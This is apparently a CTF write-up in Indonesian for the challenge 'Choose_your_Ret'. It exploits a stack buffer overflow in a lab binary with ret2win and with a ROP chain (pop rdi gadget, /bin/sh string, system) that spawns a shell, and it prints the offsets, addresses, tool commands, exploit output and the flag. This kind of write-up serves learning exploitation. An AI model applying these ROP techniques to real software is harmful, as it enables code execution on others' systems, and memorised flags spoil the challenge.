# Choose_your_Ret 

# deskripsi
name : Choose_your_Ret

deskripsi : 
“Ah, sapaan ramah dari fungsi greet... Program ini bahkan punya fungsi win atau system di dalamnya. 
Bisakah kamu memanfaatkan apa yang ada untuk memanggil shell?”

poin : 200 (solve with elf_shell/retwin)  

poin : 500 (solve with ret2libc) 

# analysis
karena program ini dilengkapi dengan libc maka perlu di patch dulu. aku gunakan pwninit. 

di gdb aku menemukan beberapa fungsi :
- main
- greet
- vulnerable
- unused_but_links_system
- usefulGadgets

cukup banyak, namun yang benar benar di panggil dan di eksekusi oleh alur progam adalah main, greet dan vulnerable.

sesuai namanya, pada fungsi vulnerable terdapat kerentanan buffer overflow .

dissassembly vulnerable()
```Assembly
   0x00000000004012a1 <+0>:     endbr64
   0x00000000004012a5 <+4>:     push   rbp
   0x00000000004012a6 <+5>:     mov    rbp,rsp
   0x00000000004012a9 <+8>:     sub    rsp,0x100 <-- ukuran buffer di stack (byte)
   ------------------------     ---    ---------
   0x00000000004012da <+57>:    mov    edx,0x400 <-- ukuran input yang diterima read() (byte)
   0x00000000004012df <+62>:    mov    rsi,rax
   0x00000000004012e2 <+65>:    mov    edi,0x0
   0x00000000004012e7 <+70>:    call   0x4010e0 <read@plt>
```

ukuran unput tersebut jauh lebih besar daripada ukuran buffer. maka jika aku input sesuatu sepanjang 0x200 byte. itu akan tetap valid namun 0x100 sisanya tidak lagi disimpan di 
buffer stack tapi disimpan di luar stack sehingga dapat menimpa alamat memori lain. di luar stack terdapat return address dan aku bisa menghitung offsetnya menggunakan gdb :

```
pwndbg> cyclic -l qaacraac
Finding cyclic pattern of 4 bytes: b'qaac' (hex: 0x71616163)
Found at offset 264
```

jarak dari input ke return address adalah `264` itu akan berguna untuk nanti.

untuk menanmpilkan flag harus pergi ke fungsi win, dan alamatnya bisa di ambil pakai gdb atau rabin2, bebas. sama saja.  

win : **0x004011f6** (tidak wajib nyari alamat win, bisa pakai elf.sym.[] dari pwntools. karena binary tidak dilengkapi pie)


data ini sudah cukup untuk melakukan ret2win, skip analysis dibawah untuk baca exploit .**jika ingin melakukan ret2shell bisa lanjut baca analyisis **


selanjutnya adalah menentukan tujuan. di dalam fungsi `unused_but_links_system()` yang memanggil system() dari libc. aku akan mencari alamat `system()` menggunakan rabin2 dari radare2

```
└> rabin2 -s vuln_patched | grep system
```
```Assembly
30  0x0000322e 0x0040122e GLOBAL FUNC   46       unused_but_links_system 
4   0x000030c0 0x004010c0 GLOBAL FUNC   16       imp.system #ini target nya 
```

didapatlah system() address : **0x004010c0**   
aku mengambil address yang kanan karena address itu adalah vaddr (virtual address) yang digunakan saat program dijalankan.

selanjutnya adalah memanggil shell, syntaks umumnya adalah **system(/bin/sh)** , namun di dalam program c ini kita gabakal bisa langsung input string, string tersebut harus 
berupa alamat memory jadi **system(alamat_memory_string)** .

untungnya string tersebut sudah ada di binary dan aku bisa menemukan alamat memory dari string tersebut dengan menggunakan rabin2 lagi
```
└> rabin2 -z vuln_patched | grep /bin
```
```Assembly
3   0x00004078 0x00402078 7   8    .rodata ascii /bin/sh
```
string address : **0x00402078**


data hampir lengkap, terakhir adalah mencari gadget untuk memasukkan string tersebut ke system() sebagai argumen 1.
```
└> file vuln_patched
```
```
vuln_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.39.so, BuildID[sha1]=9d065a69d1c2a25b1a65b764aa97c97a9f7489e5, for GNU/Linux 3.2.0, not stripped

```
karena ini adalah program 64 bit maka aku harus memasukkan string tersebut ke register. register yang mengurus argumen 1 adalah **RDI** . aku bisa mencari gadget itu dengan
ROPgadget.

```
└> ROPgadget --binary ./vuln_patched | grep "pop rdi"
```
```
0x0000000000401264 : pop rdi ; ret
```
itu adalah kandidat gadget terbaik yang bisa ditemukan, dan sepertinya memang sudah ada secara sengaja karena ini ada di dalam fungsi `usefulGadgets`.

gadget address  : **0x401264**


# exploit with ret2win

rencananya : mengisi buffer hingga penuh sesuai offset yang dihitung, lalu menimpa return address dengan fungsi win.

berikut [skrip python](ret2win-solver.py) nya.
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(easy_r21)
└> python3 solver.py
=====================================
 Welcome to easy_r2l - ret2libc 101
=====================================
Give me your input: You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6@

[+] Congratulations! Here is your flag:
flag{r3t2l1bc_or_r3t2w1n_y0u_ch0se_th3_p4th}
=====================================
 Welcome to easy_r2l - ret2libc 101
=====================================
```

# exploit with ret2shell
 rencananya : sama juga, mengisi buffer hingga penuh namun tidak menimpa return address dengan fungsi tapi dengan rop gadget poprdi. memasukkan alamat string /bin/sh ke rdi dan 
 mengeksekusi system() dengan rdi sebagai argumen pertamanya. (sama saja seperti system(/bin/sh) ) .

 berikut [skrip_python_lagi](ret2shell-solver.py)

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(easy_r21)
└> python3 solver_libc.py
[*] '/home/rotalactf/reno/pwn/project/easy_r21/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/rotalactf/reno/pwn/project/easy_r21/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './vuln': pid 6894
[*] SHELL SUCCESSS
[*] Switching to interactive mode
=====================================
 Welcome to easy_r2l - ret2libc 101
=====================================
Give me your input: You said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaad\x12@
README.md   libc.so.6           solver.py    try1
flag.txt    solve_ret2libc.py  solver_libc.py    vuln
ld-2.39.so  solve_shell.py     solver_three.py    vuln_patched
$ cat flag.txt
flag{r3t2l1bc_or_r3t2w1n_y0u_ch0se_th3_p4th}
$
```

gokilll

 
